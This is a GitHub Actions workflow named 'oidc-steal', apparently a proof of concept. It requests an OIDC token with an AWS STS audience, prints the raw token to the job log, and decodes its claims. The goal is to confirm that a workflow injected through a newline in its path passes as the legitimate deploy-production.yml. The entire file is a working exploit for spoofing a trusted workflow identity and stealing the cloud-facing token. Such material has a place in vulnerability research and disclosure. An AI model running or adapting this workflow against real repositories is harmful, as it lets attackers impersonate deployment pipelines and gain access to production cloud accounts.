name: oidc-steal
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Request OIDC token and dump claims
        run: |
          echo "=== INJECTED VIA NEWLINE PATH ==="
          echo "GITHUB_WORKFLOW_REF=$GITHUB_WORKFLOW_REF"
          echo "GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
          echo "GITHUB_JOB=$GITHUB_JOB"
          echo ""
          # Request OIDC token
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com"
            OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL")
            echo "OIDC Response:"
            echo "$OIDC_TOKEN" | python3 -m json.tool 2>/dev/null || echo "$OIDC_TOKEN"
            # Decode claims
            JWT=$(echo "$OIDC_TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
            if [ -n "$JWT" ]; then
              echo ""
              echo "=== JWT CLAIMS ==="
              echo "$JWT" | cut -d. -f2 | python3 -c "
import base64,sys,json
data = sys.stdin.read().strip()
padding = 4 - len(data) % 4
decoded = base64.urlsafe_b64decode(data + '=' * padding)
claims = json.loads(decoded)
for k,v in claims.items():
    print(f'{k}: {v}')
# KEY CHECK: is job_workflow_ref truncated at newline?
ref = claims.get('job_workflow_ref','')
print(f'\n=== CRITICAL: job_workflow_ref = {ref} ===')
if 'deploy-production.yml' in ref and 'evil' not in ref:
    print('!!! VULNERABILITY CONFIRMED: claim is truncated, shows legit workflow !!!')
else:
    print('Claim shows full/correct path (not truncated)')
"
            fi
          else
            echo "ACTIONS_ID_TOKEN_REQUEST_URL not available"
            echo "This means: either id-token permission not granted, or environment blocks it"
          fi
